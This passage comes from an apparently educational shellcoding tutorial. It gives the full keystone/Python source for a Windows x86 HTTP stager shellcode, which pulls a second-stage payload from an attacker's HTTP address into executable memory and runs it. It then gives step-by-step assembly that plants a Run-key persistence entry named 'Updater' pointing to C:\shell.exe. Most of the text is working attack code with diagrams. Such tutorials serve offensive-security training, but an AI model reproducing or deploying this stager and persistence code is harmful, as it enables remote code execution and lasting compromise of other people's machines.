  <rect x="605" y="50" width="120" height="40" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="665" y="66" text-anchor="middle" fill="#8b949e" font-size="8" font-weight="bold">Wait + Terminate</text>
  <text x="665" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">INFINITE wait</text>

  <rect x="50" y="110" width="650" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="132" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Staged Payload Delivery</text>
  <text x="375" y="150" text-anchor="middle" fill="#8b949e" font-size="10">Stager (~200 bytes) downloads full payload (~4KB+) from attacker's HTTP server at runtime</text>
</svg></div>

*Figure 16.3 -- HTTP stager pipeline. The small stager shellcode downloads a larger second-stage payload over HTTP, writes it to executable memory, and runs it in a new thread.*

### Full Shellcode Source (`stager.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x91afca54                ;"  #   VirtualAlloc
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0xca2bd06b                ;"  #   CreateThread
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0xce05d9ad                ;"  #   WaitForSingleObject
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"

    " load_wininet:                      "
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"  #   "ll"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x64                  ;"  #   → "dll\0"
    "   push  eax                       ;"
    "   push  0x2e74656e                ;"  #   "net."
    "   push  0x696e6977                ;"  #   "wini"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x14]      ;"  #   LoadLibraryA("wininet.dll")

    " resolve_symbols_wininet:           "
    "   mov   ebx, eax                  ;"
    "   push  0x57e84429                ;"  #   InternetOpenA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"
    "   push  0x7e0fed49                ;"  #   InternetOpenUrlA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x28], eax           ;"
    "   push  0x5fe34b8b                ;"  #   InternetReadFile
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x2C], eax           ;"

    " call_InternetOpenA:                "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  0x6f6d6572                ;"  #   "remo"
    "   mov   esi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   dwFlags = 0
    "   push  eax                       ;"  #   lpszProxyBypass = NULL
    "   push  eax                       ;"  #   lpszProxy = NULL
    "   inc   eax                       ;"
    "   push  eax                       ;"  #   dwAccessType = 1
    "   push  esi                       ;"  #   lpszAgent = "remo"
    "   call  dword ptr [ebp+0x24]      ;"  #   InternetOpenA

    " call_InternetOpenUrlA:             "
    "   mov   edx, eax                  ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6e69                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x62                  ;"  #   "bin\0"
    "   push  eax                       ;"
    "   push  0x2e6c6c65                ;"  #   "ell."
    "   push  0x68732f36                ;"  #   "6/sh"
    "   push  0x39312e35                ;"  #   "5.19"
    "   push  0x342e3836                ;"  #   "68.4"
    "   push  0x312e3239                ;"  #   "92.1"
    "   push  0x312f2f3a                ;"  #   "://1"
    "   push  0x70747468                ;"  #   "http"
    "   mov   esi, esp                  ;"
    "   xor   ecx, ecx                  ;"
    "   inc   ecx                       ;"
    "   shl   ecx, 0x1F                 ;"  #   INTERNET_FLAG_RELOAD
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   dwContext
    "   push  ecx                       ;"  #   dwFlags
    "   push  eax                       ;"  #   dwHeadersLength
    "   push  eax                       ;"  #   lpszHeaders
    "   push  esi                       ;"  #   lpszUrl
    "   push  edx                       ;"  #   hInternet
    "   call  dword ptr [ebp+0x28]      ;"  #   InternetOpenUrlA
    "   mov   [ebp+0x30], eax           ;"

    " call_VirtualAlloc:                 "
    "   xor   eax, eax                  ;"
    "   add   al, 0x40                  ;"  #   PAGE_EXECUTE_READWRITE
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x30                  ;"
    "   shl   ecx, 0x08                 ;"  #   MEM_COMMIT|MEM_RESERVE
    "   xor   edx, edx                  ;"
    "   mov   dl, 0x10                  ;"
    "   shl   edx, 0x08                 ;"  #   dwSize = 0x1000
    "   push  eax                       ;"
    "   push  ecx                       ;"
    "   push  edx                       ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x18]      ;"  #   VirtualAlloc
    "   mov   [ebp+0x34], eax           ;"  #   write cursor
    "   mov   [ebp+0x38], eax           ;"  #   base address

    " call_InternetReadFile:             "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   mov   edi, esp                  ;"

    " read_loop:                         "
    "   xor   eax, eax                  ;"
    "   mov   [edi], eax                ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x10                  ;"
    "   shl   ecx, 0x08                 ;"  #   0x1000 bytes per read
    "   push  edi                       ;"
    "   push  ecx                       ;"
    "   push  dword ptr [ebp+0x34]      ;"
    "   push  dword ptr [ebp+0x30]      ;"
    "   call  dword ptr [ebp+0x2C]      ;"  #   InternetReadFile
    "   mov   eax, [edi]                ;"
    "   add   [ebp+0x34], eax           ;"
    "   test  eax, eax                  ;"
    "   jnz   read_loop                 ;"

    " call_createthread:                 "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  [ebp+0x38]                ;"  #   lpStartAddress = base
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x1C]      ;"  #   CreateThread
    "   mov   [ebp+0x3C], eax           ;"

    " call_waitforsingleobject:          "
    "   xor   eax, eax                  ;"
    "   dec   eax                       ;"  #   INFINITE
    "   push  eax                       ;"
    "   push  [ebp+0x3C]                ;"
    "   call  dword ptr [ebp+0x20]      ;"  #   WaitForSingleObject

    " call_terminateprocess:             "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   dec   eax                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x10]      ;"  #   TerminateProcess(-1, 0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the HTTP stager downloading a second-stage payload from the attacker's HTTP server and executing it in memory:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/http-stager-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: HTTP stager downloading and executing a second-stage payload*

---

## 17. Registry Persistence: Surviving Reboots

Persistence ensures shellcode survives a reboot. The classic Windows technique writes to the `Run` registry key -- any executable listed there launches automatically when the user logs in.

This shellcode loads `advapi32.dll`, opens `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, writes a value named `"Updater"` pointing to `C:\shell.exe`, then exits cleanly.

### Step 1: Resolving kernel32.dll Functions

Three functions from `kernel32.dll`:

**TerminateProcess** Hash: `0x78b5b983` → `[ebp+0x10]`

**LoadLibraryA** Hash: `0xec0e4e8e` → `[ebp+0x14]`. Loads advapi32.dll.

**ExitProcess** Hash: `0x73e2d87e` → `[ebp+0x24]`

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0xec0e4e8e              ; LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x73e2d87e              ; ExitProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax
```

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1703" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1703"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1703" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1703)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1703)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1703)" font-weight="bold">Resolving 3 kernel32.dll Functions</text>

  <rect x="50" y="50" width="200" height="50" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">TerminateProcess</text>
  <text x="150" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0x78b5b983 → [ebp+0x10]</text>

  <rect x="275" y="50" width="200" height="50" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="70" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">LoadLibraryA</text>
  <text x="375" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0xec0e4e8e → [ebp+0x14]</text>

  <rect x="500" y="50" width="200" height="50" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="600" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">ExitProcess</text>
  <text x="600" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0x73e2d87e → [ebp+0x24]</text>

  <rect x="50" y="118" width="655" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="138" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">Minimal kernel32 footprint just 3 APIs</text>
  <text x="375" y="155" text-anchor="middle" fill="#8b949e" font-size="10">LoadLibraryA loads advapi32.dll for registry ops. TerminateProcess/ExitProcess for cleanup.</text>
</svg></div>

*Only three kernel32 functions are needed. The heavy lifting happens in advapi32.dll's registry APIs.*

### Step 2: Loading advapi32.dll

The registry APIs live in `advapi32.dll`, not `kernel32.dll`:

```nasm
load_advapi32:
    xor   eax, eax
    push  eax                     ; null terminator
    push  0x6c6c642e              ; ".dll"
    push  0x32336970              ; "pi32"
    push  0x61766461              ; "adva"
    mov   esi, esp                ; ESI = "advapi32.dll"
    push  esi
    call  dword ptr [ebp+0x14]   ; LoadLibraryA("advapi32.dll")
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1704" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1704"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1704" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1704" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1704)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1704)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1704)" font-weight="bold">Loading advapi32.dll String Construction</text>

  <rect x="50" y="50" width="310" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="205" y="72" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building "advapi32.dll" on Stack</text>
  <text x="70" y="92" fill="#e0e7ff" font-size="10">push 0             → null terminator</text>
  <text x="70" y="108" fill="#e0e7ff" font-size="10">push 0x6c6c642e    → ".dll"</text>
  <text x="70" y="124" fill="#e0e7ff" font-size="10">push "pi32" "adva" → advapi32</text>

  <line x1="360" y1="90" x2="390" y2="90" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1704)"/>

  <rect x="395" y="50" width="310" height="80" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="550" y="72" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">LoadLibraryA("advapi32.dll")</text>
  <text x="415" y="94" fill="#e0e7ff" font-size="10">mov esi, esp → ESI = string ptr</text>
  <text x="415" y="112" fill="#e0e7ff" font-size="10">push esi; call [ebp+0x14]</text>
  <text x="415" y="128" fill="#8b949e" font-size="9">EAX = advapi32.dll base address</text>

  <rect x="50" y="150" width="655" height="35" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="172" text-anchor="middle" fill="#8b949e" font-size="10">advapi32.dll provides RegOpenKeyExA, RegSetValueExA, RegCloseKey the registry manipulation APIs</text>
</svg></div>

*The "advapi32.dll" string is built from four DWORDs. LoadLibraryA maps it into the process so we can resolve registry functions from its export table.*

### Step 3: Resolving advapi32 Functions

Three registry functions:

**RegOpenKeyExA** `LSTATUS RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)` Opens a registry key. Hash: `0xa84aeb81`.

**RegSetValueExA** `LSTATUS RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)` Sets a value under a key. Hash: `0x2d1c9add`.

**RegCloseKey** `LSTATUS RegCloseKey(HKEY hKey)` Closes a registry handle. Hash: `0x35e273e6`.

```nasm
resolve_symbols_advapi32:
    mov   ebx, eax                ; EBX = advapi32.dll base
    push  0xa84aeb81              ; RegOpenKeyExA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
    push  0x2d1c9add              ; RegSetValueExA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
    push  0x35e273e6              ; RegCloseKey
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax
```

<div align="center"><svg viewBox="0 0 750 185" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1705" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1705"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1705" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="185" rx="10" fill="url(#bg_s1705)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1705)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1705)" font-weight="bold">Resolving 3 advapi32.dll Functions</text>

  <rect x="50" y="50" width="200" height="55" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">RegOpenKeyExA</text>
  <text x="150" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0xa84aeb81 → [ebp+0x18]</text>
  <text x="150" y="100" text-anchor="middle" fill="#8b949e" font-size="8">Open registry key</text>

  <rect x="275" y="50" width="200" height="55" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="375" y="70" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">RegSetValueExA</text>
  <text x="375" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0x2d1c9add → [ebp+0x1C]</text>
  <text x="375" y="100" text-anchor="middle" fill="#8b949e" font-size="8">Write value to key</text>

  <rect x="500" y="50" width="200" height="55" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="600" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">RegCloseKey</text>
  <text x="600" y="88" text-anchor="middle" fill="#e0e7ff" font-size="9">0x35e273e6 → [ebp+0x20]</text>
  <text x="600" y="100" text-anchor="middle" fill="#8b949e" font-size="8">Close handle</text>

  <rect x="50" y="125" width="655" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="145" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">EBX = advapi32.dll base (from LoadLibraryA return)</text>
  <text x="375" y="162" text-anchor="middle" fill="#8b949e" font-size="10">Same find_function with ROR-13 hashing, now operating on advapi32's export table</text>
</svg></div>

*Three registry APIs resolved from advapi32.dll: open a key, set a value, close the handle. These form the complete persistence write chain.*

### Step 4: RegOpenKeyExA

We open the Run key under `HKEY_CURRENT_USER`. The `HKCU` handle is `0x80000001` -- built with `shl` and `inc`:

```nasm
call_RegOpenKeyExA:
    xor   edx, edx
    lea   edx, [ebp+0x28]        ; phkResult = &[ebp+0x28]
    xor   ebx, ebx
    inc   ebx
    inc   ebx                     ; EBX = 2 (KEY_SET_VALUE)
    xor   ecx, ecx
    inc   ecx
    shl   ecx, 0x1F              ; ECX = 0x80000000
    inc   ecx                     ; ECX = 0x80000001 (HKEY_CURRENT_USER)
    ; Build registry path on stack
    xor   eax, eax
    push  eax                     ; null terminator
    xor   eax, eax
    mov   al, 0x6e                ; "n"
    push  eax                     ; "n\0\0\0"
    push  0x75525c6e              ; "n\Ru"
    push  0x6f697372              ; "rsio"
    push  0x6556746e              ; "ntVe"
    push  0x65727275              ; "urre"
    push  0x435c7377              ; "ws\C"
    push  0x6f646e69              ; "indo"
    push  0x575c7466              ; "ft\W"
    push  0x6f736f72              ; "roso"
    push  0x63694d5c              ; "\Mic"
    push  0x65726177              ; "ware"
    push  0x74666f53              ; "Soft"
    mov   edi, esp
    ; Software\Microsoft\Windows\CurrentVersion\Run
    push  edx                     ; phkResult
    push  ebx                     ; samDesired = KEY_SET_VALUE (2)
    xor   eax, eax
    push  eax                     ; ulOptions = 0
    push  edi                     ; lpSubKey
    push  ecx                     ; hKey = HKEY_CURRENT_USER
    call  dword ptr [ebp+0x18]   ; RegOpenKeyExA
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1701" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1701"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1701" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1701)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1701)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1701)" font-weight="bold">Registry Path Construction</text>

  <rect x="30" y="48" width="690" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Software\Microsoft\Windows\CurrentVersion\Run</text>

  <text x="50" y="110" fill="#8b949e" font-size="11">12 DWORD pushes build the 48-byte path:</text>
  <text x="50" y="132" fill="#ff6b35" font-size="10" font-weight="bold">"Soft" "ware" "\Mic" "roso" "ft\W" "indo" "ws\C" "urre" "ntVe" "rsio" "n\Ru" "n\0"</text>

  <rect x="50" y="148" width="310" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="205" y="170" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">HKEY_CURRENT_USER = 0x80000001</text>
  <text x="205" y="190" text-anchor="middle" fill="#e0e7ff" font-size="10">inc ecx → shl 0x1F → 0x80000000 → inc → 0x80000001</text>

  <rect x="380" y="148" width="340" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="550" y="170" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">KEY_SET_VALUE = 2</text>
  <text x="550" y="190" text-anchor="middle" fill="#e0e7ff" font-size="10">inc ebx → inc ebx → EBX = 2</text>
</svg></div>

*Figure 17.1 -- Registry path construction. The Run key path is built from 12 DWORD pushes. HKEY_CURRENT_USER is constructed with shl and inc to avoid null bytes.*

### Step 5: RegSetValueExA

With the key open, we set a value named `"Updater"` of type `REG_SZ` (1) pointing to `"C:\shell.exe"`:

```nasm
call_RegSetValueExA:
    xor   ebx, ebx
    add   ebx, 0x0D              ; cbData = 13 (including null)
    ; Build "C:\shell.exe" on stack
    xor   eax, eax
    push  eax                     ; null terminator
    push  0x6578652e              ; ".exe"
    push  0x6c6c6568              ; "hell"
    push  0x735c3a43              ; "C:\s"
    mov   edi, esp                ; EDI = "C:\shell.exe"
    ; Build "Updater" on stack
    xor   eax, eax
    push  eax                     ; null terminator
    xor   eax, eax
    mov   ax, 0x7265              ; "er"
    shl   eax, 0x08
    mov   al, 0x74                ; → "ter\0"
    push  eax
    push  0x61647055              ; "Upda"
    mov   esi, esp                ; ESI = "Updater"
    ; Call RegSetValueExA
    xor   eax, eax
    inc   eax                     ; EAX = 1 (REG_SZ)
    push  ebx                     ; cbData = 13
    push  edi                     ; lpData = "C:\shell.exe"
    push  eax                     ; dwType = REG_SZ (1)
    xor   ecx, ecx
    push  ecx                     ; Reserved = 0
    push  esi                     ; lpValueName = "Updater"
    push  dword ptr [ebp+0x28]  ; hKey
    call  dword ptr [ebp+0x1C]   ; RegSetValueExA
```

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1706" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1706"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1706" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1706" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s1706)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1706)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1706)" font-weight="bold">RegSetValueExA Writing the Persistence Entry</text>

  <rect x="50" y="48" width="320" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="68" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building "C:\shell.exe" on Stack</text>
  <text x="70" y="88" fill="#e0e7ff" font-size="10">push 0             → null terminator</text>
  <text x="70" y="104" fill="#e0e7ff" font-size="10">push ".exe" "hell" "C:\s"</text>
  <text x="70" y="120" fill="#e0e7ff" font-size="10">mov edi, esp → EDI = data pointer</text>

  <rect x="395" y="48" width="310" height="80" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="550" y="68" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Building "Updater" on Stack</text>
  <text x="415" y="88" fill="#e0e7ff" font-size="10">push 0             → null terminator</text>
  <text x="415" y="104" fill="#e0e7ff" font-size="10">shl trick → "ter\0"</text>
  <text x="415" y="120" fill="#e0e7ff" font-size="10">push "Upda" → mov esi, esp</text>

  <rect x="50" y="148" width="655" height="80" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="170" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">RegSetValueExA(hKey, "Updater", 0, REG_SZ, "C:\shell.exe", 13)</text>
  <text x="375" y="190" text-anchor="middle" fill="#e0e7ff" font-size="10">push 13 (cbData)    push EDI (lpData)    push 1 (REG_SZ)    push 0    push ESI    push [ebp+0x28]</text>
  <text x="375" y="210" text-anchor="middle" fill="#8b949e" font-size="9">REG_SZ = 1 (null-terminated string). cbData = 13 includes the null terminator. hKey from RegOpenKeyExA output.</text>
  <text x="375" y="224" text-anchor="middle" fill="#8b949e" font-size="9">inc eax builds REG_SZ value 1 without null bytes. cbData 0x0D built with add ebx, 0x0D.</text>

  <rect x="50" y="245" width="655" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="262" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">After this call: HKCU\...\Run\Updater = "C:\shell.exe"</text>
  <text x="375" y="278" text-anchor="middle" fill="#8b949e" font-size="10">On next login, Windows auto-launches C:\shell.exe under the current user's context</text>
</svg></div>

*RegSetValueExA writes the "Updater" value pointing to "C:\shell.exe". Both strings are built on the stack with DWORD pushes and the SHL trick for null-free encoding.*

### Step 6: RegCloseKey and ExitProcess

```nasm
call_RegCloseKey:
    push  dword ptr [ebp+0x28]  ; hKey
    call  dword ptr [ebp+0x20]   ; RegCloseKey

call_ExitProcess:
    xor   eax, eax
    push  eax
    call  dword ptr [ebp+0x24]   ; ExitProcess(0)
```

